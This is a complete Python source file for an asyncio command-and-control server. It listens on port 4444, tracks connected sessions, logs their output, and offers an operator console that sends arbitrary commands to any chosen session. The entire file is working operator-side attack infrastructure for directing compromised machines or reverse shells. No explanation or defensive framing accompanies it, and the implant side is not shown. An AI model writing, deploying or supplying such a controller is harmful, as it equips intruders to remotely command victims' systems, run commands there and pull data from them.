import asyncio
from colorama import Fore, init

init(autoreset=True)

class C2Controller:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.sessions = {} # Dictionary to store session objects
        self.running = False

    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        print(f"{Fore.GREEN}[+] New connection from {addr}")
        session_id = f"{addr[0]}:{addr[1]}"
        self.sessions[session_id] = {'reader': reader, 'writer': writer, 'addr': addr}
        
        try:
            while True:
                data = await reader.read(1024)
                if not data:
                    break
                print(f"{Fore.YELLOW}[Session {session_id}] Received: {data.decode().strip()}")
        except Exception as e:
            print(f"{Fore.RED}[!] Session {session_id} error: {e}")
        finally:
            print(f"{Fore.RED}[-] Session {session_id} closed")
            del self.sessions[session_id]
            writer.close()
            await writer.wait_closed()

    async def console(self):
        print(f"{Fore.CYAN}[*] Console started. Type 'list' for sessions, 'send <id> <cmd>' to run.")
        while self.running:
            try:
                cmd = await asyncio.to_thread(input, f"{Fore.WHITE}C2 > ")
            except EOFError:
                break
            
            if cmd == 'list':
                for sid in self.sessions:
                    print(f"{Fore.GREEN} - {sid}")
            elif cmd.startswith('send '):
                parts = cmd.split(' ', 2)
                if len(parts) == 3:
                    await self.send_command(parts[1], parts[2])
            elif cmd == 'exit':
                self.running = False
                break

    async def start(self):
        self.running = True
        server = await asyncio.start_server(self.handle_client, self.host, self.port)
        print(f"{Fore.CYAN}[*] C2 Server listening on {self.host}:{self.port}")
        
        # Run server and console concurrently
        await asyncio.gather(server.serve_forever(), self.console())

    async def send_command(self, session_id, command):
        if session_id in self.sessions:
            writer = self.sessions[session_id]['writer']
            writer.write(command.encode())
            await writer.drain()
            print(f"{Fore.WHITE}[>] Sent '{command}' to {session_id}")
        else:
            print(f"{Fore.RED}[!] Session {session_id} not found.")

if __name__ == "__main__":
    controller = C2Controller()
    try:
        asyncio.run(controller.start())
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Server stopped.")
